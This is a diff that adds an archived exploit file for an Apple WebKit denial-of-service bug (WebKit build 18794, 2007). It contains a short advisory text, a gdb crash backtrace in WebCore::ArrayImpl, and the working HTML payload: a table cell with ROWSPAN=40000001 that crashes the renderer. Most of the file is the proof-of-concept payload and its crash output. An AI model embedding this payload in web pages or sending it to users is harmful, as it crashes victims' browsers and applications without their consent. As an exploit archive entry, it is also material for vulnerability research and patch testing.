@@ -1,0 +1,43 @@
+source: http://www.securityfocus.com/bid/22059/info
+
+Apple WebKit is prone to a denial-of-service vulnerability.
+
+Attackers may exploit this issue by enticing victims into opening a malicious HTML document with an application using the affected framework.
+
+Successful exploits will result in denial-of-service conditions.
+
+Applications using WebKit build 18794 are vulnerable to this issue. 
+
+<!-- 
+Apple OS X WebKit WebCore::ArrayImpl "ROWSPAN" DoS
+    
+Discovered by:
+Tom Ferris
+<tommy[at]security-protocols[dot]com>
+01/14/2007
+
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_PROTECTION_FAILURE at address: 0x00000000
+0x3456fbee in WebCore::ArrayImpl::ArrayImpl ()
+(gdb) bt
+#0  0x3456fbee in WebCore::ArrayImpl::ArrayImpl ()
+#1  0x34636a28 in WebCore::RenderTableSection::ensureRows ()
+#2  0x34637417 in WebCore::RenderTableSection::addCell ()
+#3  0x34638b20 in WebCore::RenderTableRow::addChild ()
+#4  0x3456042b in WebCore::NodeImpl::createRendererIfNeeded ()
+#5  0x3448a1a0 in WebCore::ElementImpl::attach ()
+#6  0x3447ec73 in WebCore::HTMLParser::insertNode ()
+#7  0x3447f210 in WebCore::HTMLParser::handleError ()
+#8  0x3447ec4c in WebCore::HTMLParser::insertNode ()
+#9  0x3447f210 in WebCore::HTMLParser::handleError ()
+#10 0x3447ec4c in WebCore::HTMLParser::insertNode ()
+#11 0x34481402 in WebCore::HTMLParser::parseToken ()
+#12 0x34482732 in WebCore::HTMLTokenizer::processToken ()
+#13 0x344867de in WebCore::HTMLTokenizer::parseTag ()
+#14 0x344884fb in WebCore::HTMLTokenizer::write ()
+#15 0x34533ae0 in WebCore::Frame::write ()
+== snip ==
+--!>
+
+<TABLE >
+<TD ROWSPAN=40000001 >
